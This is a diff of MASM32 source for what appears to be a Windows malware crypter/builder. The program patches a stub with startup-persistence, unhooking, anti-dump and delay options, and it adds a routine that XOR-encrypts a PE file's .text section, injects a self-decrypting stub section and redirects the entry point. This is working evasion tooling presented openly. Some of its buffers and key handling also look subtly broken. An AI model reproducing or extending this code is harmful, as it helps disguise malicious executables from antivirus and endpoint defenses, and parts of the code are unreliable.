@@ -18,10 +18,14 @@ includelib shell32.lib
 includelib comdlg32.lib
 includelib shlwapi.lib
 includelib gdi32.lib
+
 IDC_BTNPACK      equ 1004
 IDC_EDITPATH     equ 1003
 IDC_BTNOPEN      equ 1005
 IDC_IMG1      equ 105
+ERROR_MAPPING_FAILED    equ 3
+ERROR_INVALID_PE        equ 4
+ERROR_NO_SECTIONS       equ 5
 
 DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM
 
@@ -29,15 +33,31 @@ DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM
     IDD_DIALOG1    equ 101
 
 .data
-
- 	szBitmapPath db "Res\header.bmp",0
+    szTextSection   db '.text',0,0,0
+    szStubSection   db '.stub',0,0,0
+    XOR_KEY         db 0
+    
+    stub    db 060h
+            db 0BFh, 0, 0, 0, 0
+            db 0B9h, 0, 0, 0, 0
+            db 0B0h, 0
+            db 030h, 007h
+            db 047h
+            db 0E2h, 0FBh
+            db 061h
+            db 0E9h, 0, 0, 0, 0
+    stub_size equ $ - stub
+    original_entry  dd 0
+    baseAddr        dd 0
+    
+    szBitmapPath db "Res\header.bmp",0
     szFilter       db "Executable Files (*.exe)", 0, "*.exe", 0, 0
     ofn            OPENFILENAME <>
     sfn            OPENFILENAME <>
     szFile         db 260 dup(0)
     szSaveFile     db 260 dup(0)
     szFileName     db 260 dup(0)
-	szExe          db ".exe", 0
+    szExe          db ".exe", 0
     szMsg          db "Please select a file first!", 0
     szCaption      db "Error", 0
     szSuccess      db "Successfully saved file to: ", 0
@@ -49,38 +69,41 @@ DlgProc PROTO :HWND, :UINT, :WPARAM, :LPARAM
     szCurrentDir   db 260 dup(0)
     szWorkingDir   db 260 dup(0)
     szTempFile db "stub.tmp", 0
-	stub_file    db "stub.bin", 0
-	str_startup_nop   db "STARTUP_NOP", 0
-	str_startup_yes   db "STARTUP_YES", 0
-	str_unhook_nop    db "UNHOOK_NOP", 0
-	str_unhook_yes    db "UNHOOK_YES", 0
-	str_antidump_nop  db "ANTIDUMP_NOP", 0
-	str_antidump_yes  db "ANTIDUMP_YES", 0
-	str_delay_nop     db "DELAY_NOP", 0
-	str_delay_yes     db "DELAY_YES", 0
-	str_secret        db "SECRET", 0
-	output_file db "payload.xyris", 0
-	
-Rndm			dd	0
-B32Chars		db	"ABCDEFGHIJKLMNOPQRSTUVXYZ",0
-
+    szTempFile2 db "stub2.tmp", 0
+    stub_file    db "stub.bin", 0
+    str_startup_nop   db "STARTUP_NOP", 0
+    str_startup_yes   db "STARTUP_YES", 0
+    str_unhook_nop    db "UNHOOK_NOP", 0
+    str_unhook_yes    db "UNHOOK_YES", 0
+    str_antidump_nop  db "ANTIDUMP_NOP", 0
+    str_antidump_yes  db "ANTIDUMP_YES", 0
+    str_delay_nop     db "DELAY_NOP", 0
+    str_delay_yes     db "DELAY_YES", 0
+    str_secret        db "SECRET", 0
+    output_file db "payload.xyris", 0
+    
+Rndm            dd    0
+B32Chars        db    "ABCDEFGHIJKLMNOPQRSTUVXYZ",0
 
 .data?
-	stub_path 	   dd ?
+    stub_copy db 24 dup(?)
+    stub_path        dd ?
     hInstance      dd ?
     hWnd           dd ?
-	input_data dd ?
-	input_size dd ?
-	output_buffer dd ?
-	file_buffer db 10000h dup(?)
-	input_payload dd ?
-	payload_size dd ?
-	stWaveObj   WAVE_OBJECT <?>
-	xWin dd ?
-	hBitmap dd ?
-	bitmp dd ?
-	szKey	db	100h	dup(?)
-	szSection	db	100h	dup(?)
+    input_data dd ?
+    input_size dd ?
+    output_buffer dd ?
+    file_buffer db 10000h dup(?)
+    input_payload dd ?
+    payload_size dd ?
+    stWaveObj   WAVE_OBJECT <?>
+    xWin dd ?
+    hBitmap dd ?
+    bitmp dd ?
+    szKey    db    ?
+    szSection    db    ?
+    szSection2   db    ?
+
 .code
 start:
     invoke GetModuleHandle, NULL
@@ -91,30 +114,29 @@ start:
 
 ;Randomize and GenRandomNumbers -> https://github.com/Xyl2k/Xylitol-MASM32-snippets/blob/master/Random/Numbers-letters/keygen.asm
 Randomize PROC uses ecx
-	invoke	GetTickCount
-	add Rndm,eax
-	add Rndm,eax
-	add Rndm,'abcd'
-	Rol Rndm,1
-	mov eax,Rndm
-;	imul eax,'seed'
-	Ret
+    invoke    GetTickCount
+    add Rndm,eax
+    add Rndm,eax
+    add Rndm,'abcd'
+    Rol Rndm,1
+    mov eax,Rndm
+    Ret
 Randomize ENDP
-GenRandomNumbers	PROC uses ebx	pIn:DWORD,pLen:DWORD
-	mov edi,pIn
-	mov ebx,pLen
-	.repeat
-		invoke	Randomize
-		mov ecx,26			
-		xor edx,edx
-		idiv ecx
-		movzx eax,byte ptr [edx+B32Chars]
-		stosb
-		dec ebx
-	.until zero?
-	Ret
-GenRandomNumbers ENDP
 
+GenRandomNumbers    PROC uses ebx    pIn:DWORD,pLen:DWORD
+    mov edi,pIn
+    mov ebx,pLen
+    .repeat
+        invoke    Randomize
+        mov ecx,26            
+        xor edx,edx
+        idiv ecx
+        movzx eax,byte ptr [edx+B32Chars]
+        stosb
+        dec ebx
+    .until zero?
+    Ret
+GenRandomNumbers ENDP
 
 align_to PROC val:DWORD, alignment:DWORD
     mov eax, val
@@ -172,7 +194,9 @@ read_ok:
     ret
 read_file ENDP
 
-add_section PROC target_file:DWORD
+add_section PROC uses ebx esi edi,
+    target_file:DWORD, section_name:DWORD
+    
     LOCAL hFile:HANDLE
     LOCAL hMapping:HANDLE
     LOCAL pMapping:DWORD
@@ -182,143 +206,161 @@ add_section PROC target_file:DWORD
     LOCAL new_section:DWORD
     LOCAL file_size:DWORD
     LOCAL aligned_size:DWORD
+    LOCAL nt_header:DWORD
+    LOCAL dos_header:DWORD
     
-    invoke CreateFileA, target_file, GENERIC_READ or GENERIC_WRITE,\
-                       FILE_SHARE_READ or FILE_SHARE_WRITE, NULL,\
-                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+    invoke CreateFileA, target_file, 
+           GENERIC_READ or GENERIC_WRITE,
+           FILE_SHARE_READ or FILE_SHARE_WRITE, 
+           NULL,
+           OPEN_EXISTING, 
+           FILE_ATTRIBUTE_NORMAL, 
+           NULL
+    
     .if eax == INVALID_HANDLE_VALUE
-        xor eax, eax
+        mov eax, ERROR_INVALID_HANDLE
         ret
     .endif
     mov hFile, eax
     
     invoke GetFileSize, hFile, NULL
+    .if eax == INVALID_FILE_SIZE
+        invoke CloseHandle, hFile
+        mov eax, ERROR_INVALID_DATA
+        ret
+    .endif
     mov file_size, eax
     
     mov eax, input_size
-    add eax, 1000h
+    add eax, 4096h
     add eax, file_size
     mov aligned_size, eax
     
-    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, aligned_size, NULL
+    invoke CreateFileMappingA, hFile, 
+           NULL, 
+           PAGE_READWRITE, 
+           0, 
+           aligned_size, 
+           NULL
     .if eax == 0
         invoke CloseHandle, hFile
-        xor eax, eax
+        mov eax, ERROR_MAPPING_FAILED
         ret
     .endif
     mov hMapping, eax
     
-    invoke MapViewOfFile, hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
+    invoke MapViewOfFile, hMapping, 
+           FILE_MAP_ALL_ACCESS, 
+           0, 
+           0, 
+           0
     .if eax == 0
         invoke CloseHandle, hMapping
         invoke CloseHandle, hFile
-        xor eax, eax
+        mov eax, ERROR_MAPPING_FAILED
         ret
     .endif
     mov pMapping, eax
+    mov dos_header, eax
     
-    mov ebx, pMapping
-    mov eax, [ebx + 3Ch]        ; e_lfanew
-    .if eax == 0
-        invoke UnmapViewOfFile, pMapping
+    mov ebx, dos_header
+    assume ebx:PTR IMAGE_DOS_HEADER
+    movzx eax, word ptr [ebx].e_magic
+    cmp ax, IMAGE_DOS_SIGNATURE
+    jne invalid_pe
+    
+    mov eax, [ebx].e_lfanew
+    add ebx, eax
+    mov nt_header, ebx
+    assume ebx:PTR IMAGE_NT_HEADERS
+    
+    mov eax, [ebx].Signature
+    cmp eax, IMAGE_NT_SIGNATURE
+    jne invalid_pe
+    
+    movzx ecx, word ptr [ebx].FileHeader.NumberOfSections
+    .if ecx == 0
         invoke CloseHandle, hMapping
         invoke CloseHandle, hFile
-        xor eax, eax
+        mov eax, ERROR_NO_SECTIONS
         ret
     .endif
-    add ebx, eax               ; PE header
-    
-    xor ecx, ecx
-    mov cx, word ptr [ebx + 6]  ; NumberOfSections
-    mov eax, ebx
-    add eax, 18h               ; Optional header
-    movzx edx, word ptr [ebx + 14h]
-    add eax, edx               ; Section headers
-    
     dec ecx
-    imul edx, ecx, 28h
-    add eax, edx
+    imul ecx, 28h
+    lea eax, [ebx + 0F8h]
+    add eax, ecx
     mov last_section, eax
     
-
-    mov esi, ebx
-    add esi, 18h
-    mov eax, [esi + 38h]      ; Section alignment
+    mov eax, [ebx].OptionalHeader.SectionAlignment
     mov section_align, eax
-    mov eax, [esi + 3Ch]      ; File alignment
+    mov eax, [ebx].OptionalHeader.FileAlignment
     mov file_align, eax
     
     mov edi, last_section
-    add edi, 28h
+    add edi, sizeof IMAGE_SECTION_HEADER
     mov new_section, edi
     
     push edi
-    lea esi, szSection
+    lea esi, section_name
     mov ecx, 8
     rep movsb
     pop edi
     
+    assume edi:PTR IMAGE_SECTION_HEADER
     mov eax, input_size
-    mov [edi + 8], eax        ; VirtualSize
+    mov [edi].Misc.VirtualSize, eax
     
     mov esi, last_section
-    mov edx, [esi + 0Ch]      ; Last section VirtualAddress
-    mov eax, [esi + 8]        ; Last section VirtualSize
-    add edx, eax
-    
+    assume esi:PTR IMAGE_SECTION_HEADER
+    mov edx, [esi].VirtualAddress
+    add edx, [esi].Misc.VirtualSize
     invoke align_to, edx, section_align
-    mov edx, new_section
-    mov [edx + 0Ch], eax      ; VirtualAddress
+    mov [edi].VirtualAddress, eax
     
     mov eax, input_size
     invoke align_to, eax, file_align
-    mov edx, new_section
-    mov [edx + 10h], eax      ; SizeOfRawData
+    mov [edi].SizeOfRawData, eax
     
     mov esi, last_section
-    mov eax, [esi + 14h]      ; Last section PointerToRawData
-    mov ecx, [esi + 10h]      ; Last section SizeOfRawData
-    add eax, ecx
+    assume esi:PTR IMAGE_SECTION_HEADER
+    mov eax, [esi].PointerToRawData
+    add eax, [esi].SizeOfRawData
     invoke align_to, eax, file_align
-    mov edx, new_section
-    mov [edx + 14h], eax      ; PointerToRawData
+    mov [edi].PointerToRawData, eax
     
-    mov edx, new_section
-    mov eax, IMAGE_SCN_MEM_READ or IMAGE_SCN_MEM_WRITE or IMAGE_SCN_CNT_INITIALIZED_DATA 
-    mov [edx + 24h], eax      ; Characteristics
+    mov eax, IMAGE_SCN_CNT_CODE or IMAGE_SCN_MEM_EXECUTE or IMAGE_SCN_MEM_READ
+    mov [edi].Characteristics, eax
     
-    mov cx, word ptr [ebx + 6]
-    inc cx
-    mov word ptr [ebx + 6], cx ; Increment NumberOfSections
+    mov ebx, nt_header
+    assume ebx:PTR IMAGE_NT_HEADERS
     
-    mov edx, new_section
-    mov eax, [edx + 0Ch]      ; New section VirtualAddress
-    add eax, [edx + 8]        ; Add VirtualSize
+    movzx eax, word ptr [ebx].FileHeader.NumberOfSections
+    inc ax
+    mov [ebx].FileHeader.NumberOfSections, ax
+    
+    mov eax, [edi].VirtualAddress
+    add eax, [edi].Misc.VirtualSize
     invoke align_to, eax, section_align
-    mov edx, ebx
-    add edx, 18h
-    mov [edx + 38h], eax      ; SizeOfImage
+    mov [ebx].OptionalHeader.SizeOfImage, eax
     
-    ; Copy section data
     mov esi, input_data
     mov edi, pMapping
-    mov edx, new_section
-    mov eax, [edx + 14h]      ; PointerToRawData
-    add edi, eax
-    
+    mov ebx, new_section
+    assume ebx:PTR IMAGE_SECTION_HEADER
+    add edi, [ebx].PointerToRawData
     mov ecx, input_size
     rep movsb
-     
-   mov eax, input_size
+    
+    mov eax, input_size
     xor edx, edx
-    div file_align           
-    .if edx != 0            
+    div file_align
+    .if edx != 0
         mov ecx, file_align
-        sub ecx, edx         
+        sub ecx, edx
         xor al, al
-        rep stosb            
+        rep stosb
     .endif
-   
+    
     invoke FlushViewOfFile, pMapping, 0
     invoke UnmapViewOfFile, pMapping
     invoke CloseHandle, hMapping
@@ -326,6 +368,14 @@ add_section PROC target_file:DWORD
     
     mov eax, 1
     ret
+
+invalid_pe:
+    invoke UnmapViewOfFile, pMapping
+    invoke CloseHandle, hMapping
+    invoke CloseHandle, hFile
+    mov eax, ERROR_INVALID_PE
+    ret
+
 add_section ENDP
 
 strlen PROC string:DWORD
@@ -361,7 +411,6 @@ process_pattern PROC uses ebx esi edi data:DWORD, dataSize:DWORD, search:DWORD, 
     invoke strlen, search
     mov searchLen, eax
     
-
     mov esi, data
     mov ecx, dataSize
     sub ecx, searchLen
@@ -383,7 +432,6 @@ process_pattern PROC uses ebx esi edi data:DWORD, dataSize:DWORD, search:DWORD, 
 @found_pattern:
     pop ecx
     
-
     mov eax, esi
     sub eax, data
 
@@ -398,6 +446,187 @@ process_pattern PROC uses ebx esi edi data:DWORD, dataSize:DWORD, search:DWORD, 
     ret
 process_pattern ENDP
 
+pack_pe_file PROC uses ebx esi edi inputPath:DWORD, outputPath:DWORD
+    LOCAL hFile:HANDLE
+    LOCAL hMapping:HANDLE
+    LOCAL pMapping:DWORD
+    LOCAL textSection:DWORD
+    LOCAL stubSection:DWORD
+    LOCAL nt_header:DWORD
+    LOCAL dos_header:DWORD
+    
+    invoke CopyFileA, inputPath, outputPath, FALSE
+test eax, eax
+    jz failed
+    
+    invoke CreateFileA, outputPath, GENERIC_READ or GENERIC_WRITE,\
+                       0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+    cmp eax, INVALID_HANDLE_VALUE
+    je failed
+    mov hFile, eax
+    
+    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
+    test eax, eax
+    jz close_file
+    mov hMapping, eax
+    
+    invoke MapViewOfFile, hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
+    test eax, eax
+    jz close_mapping
+    mov pMapping, eax
+    mov dos_header, eax
+    
+    mov ebx, pMapping
+    assume ebx:PTR IMAGE_DOS_HEADER
+    movzx eax, word ptr [ebx].e_magic
+    cmp ax, IMAGE_DOS_SIGNATURE
+    jne cleanup
+    
+    mov eax, [ebx].e_lfanew
+    add ebx, eax
+    mov nt_header, ebx
+    assume ebx:PTR IMAGE_NT_HEADERS
+    
+    mov eax, [ebx].OptionalHeader.ImageBase
+    mov baseAddr, eax
+    mov eax, [ebx].OptionalHeader.AddressOfEntryPoint
+    mov original_entry, eax
+    
+    lea esi, [ebx + sizeof IMAGE_NT_HEADERS]
+    movzx ecx, word ptr [ebx].FileHeader.NumberOfSections
+    
+find_text_section:
+    push ecx
+    push esi
+    mov edi, offset szTextSection
+    mov ecx, 5
+    repe cmpsb
+    pop esi
+    pop ecx
+    je found_text_section
+    add esi, sizeof IMAGE_SECTION_HEADER
+    loop find_text_section
+    jmp cleanup
+    
+found_text_section:
+    mov textSection, esi
+    assume esi:PTR IMAGE_SECTION_HEADER
+    
+    lea esi, stub
+    lea edi, stub_copy
+    mov ecx, stub_size
+    rep movsb
+    mov al, byte ptr [XOR_KEY]
+    mov byte ptr [stub_copy + 12], al
+    
+    mov esi, textSection
+    assume esi:PTR IMAGE_SECTION_HEADER
+    mov eax, [esi].VirtualAddress
+    add eax, baseAddr
+    mov edi, offset stub_copy
+    add edi, 2
+    mov dword ptr [edi], eax
+    
+    mov eax, [esi].SizeOfRawData
+    add edi, 5
+    mov dword ptr [edi], eax
+    
+    or dword ptr [esi].Characteristics, IMAGE_SCN_MEM_WRITE
+    
+    mov edi, pMapping
+    add edi, [esi].PointerToRawData
+    mov ecx, [esi].SizeOfRawData
+encrypt_loop:
+    mov al, byte ptr [XOR_KEY]
+    xor byte ptr [edi], al
+    inc edi
+    loop encrypt_loop
+    
+    invoke UnmapViewOfFile, pMapping
+    invoke CloseHandle, hMapping
+    invoke CloseHandle, hFile
+    
+    lea eax, stub_copy
+    mov input_data, eax
+    mov eax, stub_size
+    mov input_size, eax
+    
+    invoke add_section, outputPath,addr szSection
+    test eax, eax
+    jz failed
+    
+    invoke CreateFileA, outputPath, GENERIC_READ or GENERIC_WRITE,\
+                       0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
+    mov hFile, eax
+    
+    invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
+    mov hMapping, eax
+    
+    invoke MapViewOfFile, hMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0
+    mov pMapping, eax
+    
+    mov ebx, pMapping
+    assume ebx:PTR IMAGE_DOS_HEADER
+    mov eax, [ebx].e_lfanew
+    add ebx, eax
+    mov nt_header, ebx
+    assume ebx:PTR IMAGE_NT_HEADERS
+    
+    movzx ecx, word ptr [ebx].FileHeader.NumberOfSections
+    dec ecx
+    lea ebx, [ebx + sizeof IMAGE_NT_HEADERS]
+    imul eax, ecx, sizeof IMAGE_SECTION_HEADER
+    add ebx, eax
+    mov stubSection, ebx
+    
+    mov ebx, stubSection
+    assume ebx:PTR IMAGE_SECTION_HEADER
+    mov eax, [ebx].VirtualAddress
+    add eax, stub_size
+    mov ecx, eax
+    mov eax, original_entry
+    sub eax, ecx
+    
+    mov edi, pMapping
+    add edi, [ebx].PointerToRawData
+    add edi, stub_size
+    sub edi, 4
+    mov dword ptr [edi], eax
+    
+    mov ebx, nt_header
+    assume ebx:PTR IMAGE_NT_HEADERS
+    mov esi, stubSection
+    assume esi:PTR IMAGE_SECTION_HEADER
+    mov edx, [esi].VirtualAddress
+    mov [ebx].OptionalHeader.AddressOfEntryPoint, edx
+    
+    invoke FlushViewOfFile, pMapping, 0
+    invoke UnmapViewOfFile, pMapping
+    invoke CloseHandle, hMapping
+    invoke CloseHandle, hFile
+    
+    mov eax, 1
+    ret
+
+close_mapping:
+    invoke CloseHandle, hMapping
+    
+close_file:
+    invoke CloseHandle, hFile
+    
+cleanup:
+    invoke UnmapViewOfFile, pMapping
+    invoke CloseHandle, hMapping
+    invoke CloseHandle, hFile
+    xor eax, eax
+    ret
+    
+failed:
+    xor eax, eax
+    ret
+
+pack_pe_file ENDP
+
 scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD, antidump:DWORD,delay:DWORD, key:DWORD
     LOCAL hMapping:HANDLE
     LOCAL fileData:DWORD
@@ -406,14 +635,10 @@ scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD
     
     mov found, 0
     
-
-
     invoke GetFileSize, hFile, NULL
     mov fileSize, eax
     
-
     invoke CreateFileMappingA, hFile, NULL, PAGE_READWRITE, 0, 0, NULL
- 
     mov hMapping, eax
 
     invoke MapViewOfFile, hMapping, FILE_MAP_WRITE, 0, 0, 0
@@ -422,7 +647,6 @@ scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD
         ret
     .endif
     mov fileData, eax
-    
     
     .if startup
         invoke process_pattern, fileData, fileSize,\
@@ -456,7 +680,6 @@ scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD
         .endif
     .endif
     
- 
     .if key != 0
         invoke process_pattern, fileData, fileSize,\
                offset str_secret, key
@@ -465,7 +688,6 @@ scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD
         .endif
     .endif
     
- 
     invoke FlushViewOfFile, fileData, 0
     invoke UnmapViewOfFile, fileData
     invoke CloseHandle, hMapping
@@ -473,7 +695,6 @@ scan_and_replace PROC uses ebx esi edi hFile:HANDLE, startup:DWORD, unhook:DWORD
     mov eax, found
     ret
 scan_and_replace ENDP
-
 
 CopyMemory PROC uses edi esi ecx dest:DWORD, src:DWORD, len:DWORD
     mov edi, dest
@@ -490,6 +711,13 @@ Decrypt PROC uses eax esi edi ebx section:DWORD, size_var:DWORD, outBuffer:DWORD
     LOCAL keyIndex:DWORD
     LOCAL bytesProcessed:DWORD
     LOCAL buffer[4096]:BYTE
+    
+    invoke GetTickCount
+    mov ecx, 255
+    xor edx, edx
+    div ecx
+    inc edx
+    mov byte ptr [XOR_KEY], dl
     
     mov esi, section
     mov keyIndex, 0
@@ -556,6 +784,7 @@ save_file PROC filepath:DWORD, buffer:DWORD, size_val:DWORD
     mov eax, 1
     ret
 save_file ENDP
+
 DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
    LOCAL wID:WORD
    LOCAL hFile:HANDLE
@@ -606,11 +835,9 @@ DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
        mov wID, ax
        
        .if wID == IDC_BTNOPEN
-       
-  		   invoke GenRandomNumbers,addr szKey, 6
-  		   invoke GenRandomNumbers,addr szSection, 6
- 
-      
+           invoke GenRandomNumbers,addr szKey, 6
+           invoke GenRandomNumbers,addr szSection, 6
+     	   invoke GenRandomNumbers,addr szSection2, 6
            mov ofn.lStructSize, sizeof OPENFILENAME
            push hWin
            pop ofn.hwndOwner
@@ -669,7 +896,7 @@ DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
                .endif
                mov hFile, eax
 
-               invoke IsDlgButtonChecked, hWin, 1007
+               invoke IsDlgButtonChecked, hWin,1007
                .if eax == BST_CHECKED
                    mov startup, 1
                .else
@@ -713,13 +940,16 @@ DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
                    jmp @process_done
                .endif
                
-               invoke add_section, addr szTempFile
+               invoke add_section, addr szTempFile, addr szSection2
+               
+               invoke pack_pe_file, addr szTempFile, addr szTempFile2
                .if eax == 0
                    invoke GetProcessHeap
                    push eax
                    invoke HeapFree, eax, 0, input_data
                    pop eax
                    invoke DeleteFileA, addr szTempFile
+                   invoke DeleteFileA, addr szTempFile2
                    invoke DeleteFileA, addr output_file
                    jmp @process_done
                .endif
@@ -739,7 +969,8 @@ DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
                
                invoke GetSaveFileName, addr sfn
                .if eax != 0
-                   invoke CopyFileA, addr szTempFile, addr szSaveFile, FALSE
+                   invoke CopyFileA, addr szTempFile2, addr szSaveFile, FALSE
+                   invoke DeleteFileA, addr szTempFile2
                    invoke DeleteFileA, addr szTempFile
                    invoke lstrcpy, addr szSuccessMsg, addr szSuccess
                    invoke lstrcat, addr szSuccessMsg, addr szSaveFile
@@ -752,10 +983,21 @@ DlgProc PROC hWin:HWND, uMsg:UINT, wParam:WPARAM, lParam:LPARAM
        @process_done:
        .endif
 
+   .elseif eax == WM_PAINT
+       invoke BeginPaint, hWin, addr @stPs
+       mov @hDc, eax
+       invoke CreateCompatibleDC, @hDc
+       mov hMemDC, eax
+       invoke SelectObject, hMemDC, hBitmap
+       invoke GetClientRect, hWin, addr @stRect
+       invoke DeleteDC, hMemDC
+       invoke _WaveUpdateFrame, addr stWaveObj, eax, TRUE
+       invoke EndPaint, hWin, addr @stPs
+       
    .elseif eax == WM_LBUTTONDOWN
        mov eax, lParam
-       movzx ecx, ax      
-       shr eax, 16        
+       movzx ecx, ax
+       shr eax, 16
        invoke _WaveDropStone, addr stWaveObj, ecx, eax, 2, 256
        
    .elseif eax == WM_CLOSE
@@ -779,4 +1021,5 @@ _Quit proc
    invoke PostQuitMessage, NULL
    ret
 _Quit ENDP
+
 END start
